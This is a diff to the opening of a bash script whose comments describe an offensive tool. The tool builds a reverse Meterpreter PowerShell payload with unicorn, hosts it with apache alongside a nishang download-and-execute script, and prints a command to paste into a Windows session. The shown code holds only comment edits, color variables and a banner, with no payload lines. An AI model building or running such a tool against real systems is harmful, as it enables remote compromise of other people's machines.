@@ -1,19 +1,20 @@
 #!/bin/bash
+#Author: r3cursive123
+#
+#
 #This is a quick script that will generate a reverse meterpreter tcp powershell payload using unicorn
 #and host it using apache. It will also host Download-Execute-PS.ps1 which is a powershell script
 #that I grabbed from nishang toolset that downloads and executes the previously created payload
 #
 #At the end of the script a command will be printed to the screen
-#You will need to paste this command into your existing normal reverse shell (windows/shell/reverse_tcp)
+#You will need to paste this command into your existing windows cmd session
 #
 #
 #######
 #COLORS
 cyan='\e[0;36m'
-okegreen='\033[92m'
 white='\e[1;37m'
 red='\e[1;31m'
-
 clear
 echo -e $cyan""
 echo -e "*"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"$white" *"$cyan" *"
